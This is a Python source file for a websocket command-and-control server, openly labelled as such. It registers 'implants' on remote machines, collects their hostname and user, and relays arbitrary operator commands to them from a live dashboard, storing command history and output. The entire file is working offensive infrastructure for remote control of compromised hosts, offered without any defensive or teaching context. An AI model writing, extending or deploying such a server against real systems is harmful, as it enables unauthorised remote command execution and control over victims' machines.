# c2_server.py — REAL-TIME WEBSOCKET C2 (2025 EDITION)
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import uvicorn
import os

app = FastAPI()

implants = {}            # implant_id → info
panel_clients = set()    # all connected operator dashboards
connections = {}         # implant_id → implant websocket
command_history = {}     # implant_id → list of cmds


# ----------------------------------------------------------
# PANEL WEB UI
# ----------------------------------------------------------
@app.get("/")
async def panel():
    # Load UI from panel.html
    with open("panel.html", "r", encoding="utf-8") as f:
        return HTMLResponse(f.read())


# ----------------------------------------------------------
# PANEL WEBSOCKET (operator UI)
# ----------------------------------------------------------
@app.websocket("/panel")
async def ws_panel(websocket: WebSocket):
    await websocket.accept()
    panel_clients.add(websocket)

    print("[+] PANEL CONNECTED")

    # Send initial state
    await websocket.send_json({"implants": implants,
                               "history": command_history})

    try:
        while True:
            msg = await websocket.receive_text()

            # FORMAT: CMD::implant_id::command
            if msg.startswith("CMD::"):
                _, implant_id, cmd = msg.split("::", 2)

                # save history
                command_history.setdefault(implant_id, []).append(cmd)

                # forward to implant
                if implant_id in connections:
                    await connections[implant_id].send_text(cmd)

                print(f"[CMD] → {implant_id}: {cmd}")

            elif msg == "REQ_UPDATE":
                await websocket.send_json({"implants": implants,
                                           "history": command_history})

    except WebSocketDisconnect:
        print("[!] PANEL DISCONNECTED")
        panel_clients.remove(websocket)


# ----------------------------------------------------------
# IMPLANT WEBSOCKET CONNECTION
# ----------------------------------------------------------
@app.websocket("/ws/{implant_id}")
async def ws_implant(websocket: WebSocket, implant_id: str):
    await websocket.accept()

    print(f"[+] IMPLANT CONNECTED → {implant_id}")

    connections[implant_id] = websocket
    implants.setdefault(implant_id, {
        "hostname": "unknown",
        "user": "unknown",
        "output": "",
        "online": True
    })
    command_history.setdefault(implant_id, [])

    await broadcast_panels()

    try:
        while True:
            msg = await websocket.receive_text()

            if msg.startswith("INFO::"):
                # INFO FORMAT: INFO::hostname|user
                meta = msg.split("::", 1)[1]
                hostname, user = meta.split("|")
                implants[implant_id]["hostname"] = hostname
                implants[implant_id]["user"] = user
                implants[implant_id]["online"] = True

                await broadcast_panels()

            else:
                # command output
                implants[implant_id]["output"] = msg
                print(f"[OUTPUT] {implant_id}:\n{msg}\n")

                await broadcast_panels()

    except WebSocketDisconnect:
        print(f"[!] IMPLANT DISCONNECTED → {implant_id}")
        implants[implant_id]["online"] = False
        if implant_id in connections:
            del connections[implant_id]
        await broadcast_panels()


# ----------------------------------------------------------
# SEND LIVE DATA TO ALL PANELS
# ----------------------------------------------------------
async def broadcast_panels():
    dead = []

    for ws in panel_clients:
        try:
            await ws.send_json({"implants": implants,
                                "history": command_history})
        except:
            dead.append(ws)

    for d in dead:
        panel_clients.remove(d)


# ----------------------------------------------------------
# RUN SERVER
# ----------------------------------------------------------
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8001)
